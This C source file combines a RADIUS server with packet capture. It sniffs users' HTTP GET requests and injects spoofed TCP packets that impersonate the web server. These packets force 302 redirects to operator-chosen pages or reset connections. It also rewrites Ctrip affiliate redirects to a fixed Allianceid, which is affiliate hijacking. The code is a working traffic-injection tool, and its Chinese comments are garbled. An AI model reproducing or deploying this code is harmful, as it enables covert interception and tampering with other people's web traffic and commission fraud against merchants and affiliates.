/***************************************************
* file:     testpcap1.c
* Date:     Thu Mar 08 17:14:36 MST 2001 
* Author:   Martin Casado
* Location: LAX Airport (hehe)
*
* Simple single packet capture program
*****************************************************/
#ifdef _CAP

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <semaphore.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> /* includes net/ethernet.h */
#include <pcap.h>
#include <string.h>
#include <ctype.h>
#include <libnet.h>
#include <syslog.h>
#include <pthread.h>

#include "radiusd.h"
#include "cap.h"

int fd = -1;
static char url[4096];

/* ethernet headers are always exactly 14 bytes */
#define SIZE_ETHERNET 14

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
//#define ETHER_ADDR_LEN	6

#define HTTP_302        "HTTP/1.1 302 Found\r\n"\
                        "Location: %s?sUrl=%s\r\n"\
                        "Content-Type: text/html\r\n\r\n"

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
//#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
//#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

struct sniff_udp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        u_short th_len;                 /* len */
        u_short th_sum;                 /* checksum */
};

struct sniff_tcp {
        u_short th_sport; /* source port */
        u_short th_dport; /* destination port */
        tcp_seq th_seq; /* sequence number */
        tcp_seq th_ack; /* acknowledgement number */
        u_char th_offx2; /* data offset, rsvd */
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
        u_char th_flags;
        #define TH_FIN 0x01
        #define TH_SYN 0x02
        #define TH_RST 0x04
        #define TH_PUSH 0x08
        #define TH_ACK 0x10
        #define TH_URG 0x20
        #define TH_ECE 0x40
        #define TH_CWR 0x80
        #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win; /* window */
        u_short th_sum; /* checksum */
        u_short th_urp; /* urgent pointer */
};

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

	return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

	return;
}

/*
 *      ��ȡURL
 */
void get_url(char *data)
{
        char* host_tmp = NULL;
        char* url_tmp = url;
        int len = 0;

        host_tmp = strstr(data,"Host:");
        if ( NULL != host_tmp ) {
                host_tmp = host_tmp + 6;
                while(*host_tmp!='\r') {
                        len++;
                        if ( len >= 1024) break;
                        *url_tmp++ = *host_tmp++;
                }
                *url_tmp='\0';

                host_tmp = (char *)(data+4);
                if ( NULL != host_tmp ) {
                        while(*host_tmp!='\r') {
                                len++;
                                if ( len >= 2048 ) break;
                                *url_tmp++ = *host_tmp++;
                        }
                        /* �޳�HTTP/1.1 */
                        *(url_tmp-8)='\0';
                }
        }
}

/*
 *      �����
 */
void devsrandom() {
        int             fd;
        u_long          seed;

        fd = open("/dev/urandom", O_RDONLY);
        if (fd == -1) {
                fd = open("/dev/random", O_RDONLY);
                if (fd == -1) {
                        struct timeval  tv;
                        gettimeofday(&tv, NULL);
                        srandom((tv.tv_sec ^ tv.tv_usec) * tv.tv_sec * tv.tv_usec ^ tv.tv_sec);
                        return;
                }
        }
        read(fd, &seed, sizeof(seed));
        close(fd);
        srandom(seed);
}

void sendtcp(int fd, struct ip *ip, struct tcphdr *tcp,
        u_char flags, u_long seq, u_long ack, char *data, int datalen)
{
        u_char         *packet;
        int             psize;

        devsrandom();
        psize = LIBNET_IP_H + LIBNET_TCP_H + datalen;
        libnet_init_packet(psize, &packet);
        if (!packet)
                libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");

        libnet_build_ip(LIBNET_TCP_H + datalen, // size of the packet sans IP header
                IPTOS_LOWDELAY,                 // IP tos
                libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
                0,                              // frag stuff
                libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
                IPPROTO_TCP,                    // transport protocol
                *((u_long *)&(ip->ip_dst)),     // source IP (pretend we are dst)
                *((u_long *)&(ip->ip_src)),     // destination IP (send back to src)
                NULL,                           // payload (none)
                0,                              // payload length
                packet                          // packet header memory
        );

        libnet_build_tcp(htons(tcp->th_dport),  // source TCP port (pretend we are dst)
                htons(tcp->th_sport),           // destination TCP port (send back to src)
                htonl(seq),                     // sequence number (use previous ack)
                htonl(ack),                     // acknowledgement number (randomized)
                flags,                          // control flags (RST flag set only)
                libnet_get_prand(LIBNET_PRu16), // window size (randomized)
                0,                              // urgent pointer
                (u_char *)data,                 // payload (none)
                datalen,                        // payload length
                packet + LIBNET_IP_H            // packet header memory
        );

        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H+datalen) == -1)
                libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

        int bcount = libnet_write_ip(fd, packet, LIBNET_IP_H+LIBNET_TCP_H+datalen);
        if (bcount < LIBNET_IP_H + LIBNET_TCP_H+datalen)
                libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");
        libnet_destroy_packet(&packet);
        return;
}

/******************************************************************************
 *  parse_http                                                                *
 *                                                                            *
 *  take a packet and print it (verbose or not)                               *
 *  store relevant information in our cc struct                               *
 *  arg1: (char *) pointer to packet                                          *
 *  arg2: (int)    captured packet length                                     *
 *  ret:  none                                                                *
 ******************************************************************************/
void parse_http(char *packet, int caplen)   {
    struct   ip      *ip;           /* ip header                   */
    struct   tcphdr  *tcp;          /* tcp header                  */
    char     *data,                 /* pointer to dns payload      */
             *data_backup;          /* we modify data so keep orig */
    u_long   rdata;                 /* rdata in network byte order */
    int      datalen,               /* length of dns payload       */
             c = 1,                 /* used in name extraction     */
             i;                     /* loop counter                */
    char     buf[4096];		    /* ���ݻ����� 		 ��*/
    int	     bufLen = 0;
	
    u_char   isCache = 0;	    /* �Ƿ�ӻ��������� 	  */

    u_long   ack, seq;		    /* tcp ack & seq 		  */

    char     antKey[64];	    /* �ٳֻ�������		  */ 
    char     antAction[8];	    /* �ٳֶ�������		  */ 
    char     antURL[256];	    /* �ٳ־���URL  		  */ 
    int      isAnt = 1;		    /* �ٳ����ͣ�0��ʾ���ٳ֣�1��ʾHTTP���棬2��ʾ��ֹ, 3��ʾHTTP���� */
    int	     antLen = 0;
    int      offset = 14;

    char     timeKey[64];	    /* �ٳ�ʱ������ */
    char     timeValue[16];	    /* �ٳ�ʱ�� */

    static   int cs = 0;

    ip   = (struct ip     *) (packet + offset);
    tcp  = (struct tcphdr *) (packet + offset + LIBNET_IP_H);
    data = (packet + offset + LIBNET_IP_H + LIBNET_TCP_H);

	
    /* �����TCP������״̬���˳� */
    if ( !(tcp->th_flags & TH_ACK) )
        return;

    /* ��HTTP GET���󲻽ٳ� */
    if ( memcmp(data, "GET", 3) != 0 ) 
	return;

    if ( strstr(data, ".js") != NULL || strstr(data, ".jpg") != NULL       
        || strstr(data, ".xml") != NULL || strstr(data, ".gif") != NULL 
        || strstr(data, ".png") != NULL || strstr(data, ".css") != NULL 
        || strstr(data, ".swf") != NULL || strstr(data, ".zip") != NULL 
        || strstr(data, ".rar") != NULL || strstr(data, ".xls") != NULL 
        || strstr(data, ".doc") != NULL || strstr(data, ".ppt") != NULL 
        || strstr(data, ".flv") != NULL || strstr(data, ".txt") != NULL 
        || strstr(data, ".ico") != NULL || strstr(data, ".rar") != NULL 
        || strstr(data, ".jpeg") != NULL || strstr(data, "img") != NULL 
        || strstr(data, ".exe") != NULL || strstr(data, ".tar.gz") != NULL )   
        return;

    /* ��ȡURL */
    //DEBUG("From: %s\n", inet_ntoa(ip->ip_src));

    get_url(data);

    if ( strlen(url) <= 0 ) return;

    //printf("URL-->%s\n", url);
#if 0
    if ( strstr(url, "u.ctrip.com/union/CtripRedirect.aspx") != NULL ) {
    	printf("####################URL-->%s\n", url);
    }

    if ( strstr(url, "union.dangdang.com/transfer.php") != NULL ) {
    	printf("--------------------------URL-->%s\n", url);
    }
#endif

#if 0
    if ( strstr(url, ".apk") != NULL ) {
    	printf("**********URL-->%s\n", url);
    }
#endif

    //radlog(L_INFO, "URL-->%s\n", url);
    //printf("URL-->%s\n", url);

    //return;

#if 0
    char tt[1024];
    memset((void *)tt, 0, 1024);
    memcpy(tt, data, 64);

    printf("URL-->%s\n", tt);

    return;
#endif


    /* �ٳֵ�����ȥ�Ĳ��ٽٳ� */
    if ( strstr(url, "60.10.127.98") != NULL ) 
	return;

    /*
     *  we modify the data pointer, so save the original position
     */
    data_backup = data;

    //printf("\nHTTP data:       \n%s", data);

    //printf("\nHTTP activity:       %s:%d > ", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
    //printf("%s:%d\n",                         inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));
    //printf("SEQ = 0x%lx ACK = 0x%lx\n",       htonl(tcp->th_seq), htonl(tcp->th_ack));
    //printf("URL = %s\n", url);

    seq = tcp->th_seq;
    ack = tcp->th_ack;

#if 0
    sprintf(antKey, "%s_antAction", inet_ntoa(ip->ip_src));
    if ( 0 != cache_get(antKey, antAction, &antLen) ) {
	printf("\nMemcache get antAction fail.\n");
    }else {
	if ( antLen > 0 ) isAnt = atoi(antAction);
    }
#endif

    /* ����ٳ� */
    isAnt = 1;

    if ( strstr(url, "u.ctrip.com/union/CtripRedirect.aspx") != NULL && strstr(url, "Allianceid=10823") == NULL ) {
    	//printf("###########1111111#########URL-->%s\n", url);
	isAnt = 4;	
    }

    /*
     *	TCP�������
     *	���͵�SEQ�����������ACK
     *  ���OK
     */
    if ( isAnt == 2 ) {
    	sendtcp(fd, ip, tcp,TH_RST, ack, libnet_get_prand(LIBNET_PRu32), NULL, 0);
    	//printf("\nConnection has been reset.\n");
    }

    if ( isAnt == 1 || isAnt == 3 || isAnt == 4 || isAnt == 5 || isAnt == 6 || isAnt == 7 || isAnt == 8 ) {

#if 0
    	/*
     	 * Sending 1024 of zero bytes so the real owner of the TCP connection
     	 * wont be able to get us out of sync with the SEQ.
     	 */
    	memset(buf, 0, sizeof(buf));
    	sendtcp(fd, ip, tcp, TH_ACK | TH_PUSH, ack, seq, buf, 1024);
    	seq += 1024;
#endif

    	/*
     	 * 	FIXME
     	 *	Check From Memcache
     	 */

    	/* log the url */
    	//radlog(L_INFO, "CACHELOG: %ld,%s,%d,%s", time(NULL), inet_ntoa(ip->ip_src), isCache, url); 

    	/*
     	 *	set the real data
     	 */
    	memset(buf, 0, sizeof(buf));

    	/*
     	 * http://www.sudone.com/get/http://www.google.com/tools/dlpage/res /chrome/images/chrome-205_noshadow.png
     	 */
	if ( isAnt == 1 ) {
#if 1
		/* http ����ٳ� */
    		sprintf(antKey, "%s_antURL", inet_ntoa(ip->ip_src));
    		if ( 0 != cache_get(antKey, antURL, &antLen) ) {
			//printf("\nMemcache get antURL fail.\n");
			return;
		}else {
    			//printf("---****---LOG: [%s][%d]\n", antURL, antLen);
			*(antURL+antLen) = '\0';
    			sprintf(timeKey, "%s_t", antKey);
    			if ( 0 == cache_get(timeKey, timeValue, &antLen) ) {
				if ( strlen(timeValue) > 0 ) {
					if ( time(NULL) - strtol(timeValue, NULL, 0) > 360 ) {
						/* ����5���ӽ���������������ɾ�� */
						cache_del(antKey);
						cache_del(timeKey);
						return;
					}
				}	
			}else {
				/* ����ǰʱ��洢���� */
				sprintf(timeValue, "%ld", time(NULL));
				cache_replace(timeKey, timeValue);
			}
    			//sprintf(buf, HTTP_302, "http://172.16.20.111/radius/informpop.jsp", url);
    			//sprintf(buf, HTTP_302, "http://172.16.20.111/radius/informpop.jsp", url);
    			sprintf(buf, HTTP_302, antURL, url);
    			//sprintf(buf, HTTP_302, "http://60.10.135.125/radius/inform.jsp", url);
		}

    		//printf("---****---LOG: %s", buf);

#else
		//if ( memcmp(inet_ntoa(ip->ip_src), "110.251.159.135", 15) != 0 ) {
		//	return;
		//}

    		//sprintf(buf, HTTP_302, "http://172.16.20.111/radius/inform.jsp", url);
    		sprintf(buf, HTTP_302, "http://60.10.127.98/radius/inform.jsp", url);
    		//sprintf(buf, HTTP_302, "http://60.10.9.251/radius/inform.jsp?sUserName=user1");
    		//sprintf(buf, HTTP_302, "http://60.10.9.251/radius/inform.jsp");
#endif
	}else if ( isAnt == 3 ) {
#if 0
		/* http ����ٳ� */
    		sprintf(antKey, "%s_cacheURL", url);
    		if ( 0 != cache_get(antKey, antURL, &antLen) ) {
			printf("\nMemcache get cacheURL fail.\n");
		}
    		sprintf(buf, HTTP_302, "http://10.20.10.10/get/http://", antURL);
#endif
      	}else if ( isAnt == 4 ) {
    		sprintf(buf, HTTP_302, "http://u.ctrip.com/union/CtripRedirect.aspx?TypeID=2&Allianceid=10823&sid=276426&OUID=&jumpUrl=http://www.ctrip.com/");
    		//printf("\nspoofing HTTP answer:    %s > ", buf);
	}

    	//printf("\nspoofing HTTP answer:    %s > ", buf);

    	bufLen = strlen(buf); 
    	//radlog(L_INFO, "HTTP_302_LOG: %s,%s", inet_ntoa(ip->ip_src), buf); 
    	//printf("HTTP_302_LOG: %s,[%s][%d]\n", inet_ntoa(ip->ip_src), buf, bufLen); 

#if 1
    	sendtcp(fd, ip, tcp, TH_ACK | TH_PUSH, ack, seq, buf, bufLen);

    	//printf("\nspoofing HTTP answer:    %s:%d > ", inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));
    	//printf("%s:%d\n",                         inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
    	//printf("SEQ = 0x%lx ACK = 0x%lx\n",       htonl(ack), htonl(seq));
    	//printf("Content = %s\n", (char *)buf);

    	seq += bufLen;

    	/*
     	 *	send the final data
     	 */
    	sendtcp(fd, ip, tcp, TH_ACK | TH_FIN, ack, libnet_get_prand(LIBNET_PRu32), NULL, 0);
    	//radlog(L_INFO, "HTTP_302_LOG: %s,%s", inet_ntoa(ip->ip_src), buf); 
    	//printf("HTTP_302_LOG: %s,[%s][%d]\n", inet_ntoa(ip->ip_src), buf, bufLen); 
#endif
    }

    return;
}

void analysis(char *argument, const struct pcap_pkthdr* packet_header, const u_char* packet)
{
	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_udp *udp;            /* The UDP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_udp;
	int size_payload;
	int size_udp_head = 8;

	AUTH_REQ *request = NULL;

	//DEBUG("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		radlog(L_ERR, "   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	DEBUG("       From: %s\n", inet_ntoa(ip->ip_src));
	DEBUG("         To: %s\n", inet_ntoa(ip->ip_dst));
	
	/* determine protocol */	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			//DEBUG("   Protocol: TCP\n");
			parse_http(packet, (int)packet_header->caplen);
			return;
		case IPPROTO_UDP:
			//DEBUG("   Protocol: UDP\n");
			//return;
			break;
		case IPPROTO_ICMP:
			//DEBUG("   Protocol: ICMP\n");
			return;
		case IPPROTO_IP:
			DEBUG("   Protocol: IP\n");
			return;
		default:
			DEBUG("   Protocol: unknown\n");
			return;
	}

	/*
	 *  OK, this packet is UDP.
	 */
	
	/* define/compute tcp header offset */
	udp = (struct sniff_udp *)(packet + SIZE_ETHERNET + size_ip);
	size_udp = ntohs(udp->th_len);
	if (size_udp < size_udp_head ) {
		//radlog(L_ERR, "   * Invalid UDP header length: %u bytes\n", size_udp);
		return;
	}

	/* radius packet */
	if ( ntohs(udp->th_dport) != 1813 && ntohs(udp->th_dport) != 1646 ) {
		return;
	}
	
	//DEBUG("   Src port: %d\n", ntohs(udp->th_sport));
	//DEBUG("   Dst port: %d\n", ntohs(udp->th_dport));
	//DEBUG("   len: %d\n", size_udp);
	
	/* define/compute udp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp_head);
	
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_udp_head);

	if ( ntohs(udp->th_dport) != 1813 && ntohs(udp->th_dport) != 1646 ) {
		return;
	}

	/*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
	if (size_payload > 0) {
		//DEBUG("   Payload (%d bytes):\n", size_payload);

		//print_payload(payload, size_payload);

		/* ����radius���ݰ� */
		if ( NULL != (request = radrecv(ntohl(ip->ip_src.s_addr), ntohs(udp->th_sport), payload, size_payload)) ) {
			/* ��ʼ���� */
			cap_respond(request);
		}
	}

	return;
}

int cap_process(char *iface)
{
    	char *dev; 
    	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* descr;

	/* ip or pppoes */
	struct bpf_program bpf_filter;

	/* get the pppoe data */
	char bpf_filter_string[] = "udp port 1646 or udp port 1813 or tcp port 80";
	//char bpf_filter_string[] = "tcp port 80";
	//char bpf_filter_string[] = "";
	//bpf_filter_string[0] = conf_get_string("Cap", "Cap Filter");

	bpf_u_int32 net_mask;
        bpf_u_int32 net_ip;

	if ( NULL == iface ) {
    		/* grab a device to peak into... */
		if ( NULL == (dev = conf_get_string("Cap", "Cap Interface")) ) {
    			dev = pcap_lookupdev(errbuf);
		}

    		if(dev == NULL) {
        		radlog(L_ERR,"%s\n",errbuf);
			return -1;
    		}
	}else {
		dev = iface;
	}

	pcap_lookupnet(dev, &net_ip, &net_mask, errbuf);

    	/* open the device for sniffing.
       	Note if you change "prmisc" param to anything other than zero, you will
       	get all packets your device sees, whether they are intendeed for you or
       	not!! Be sure you know the rules of the network you are running on
       	before you set your card in promiscuous mode!!     */

	DEBUG("cap_process: Caputer Interface %s Mode %d", dev, conf_get_integer("Cap", "Mode"));
    	descr = pcap_open_live(dev, BUFSIZ, conf_get_integer("Cap", "Mode"), 1, errbuf);

    	if(descr == NULL) {
        	radlog(L_ERR,"pcap_open_live(): %s\n",errbuf);
		return -2;
    	}

	if (pcap_datalink(descr) != DLT_EN10MB) {
    		radlog(L_ERR, "This program only supports Ethernet cards!\n");
		return -3;
  	}

	if ((fd = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
            radlog(L_ERR, "network initialization failed\n");

	pcap_compile(descr, &bpf_filter, bpf_filter_string, 0, net_ip);
        pcap_setfilter(descr, &bpf_filter);

	//pcap_loop(descr,  -1, ip_packets_handle_callback, NULL);
	pcap_loop(descr, -1, analysis, NULL);

	return 0;
}

#endif
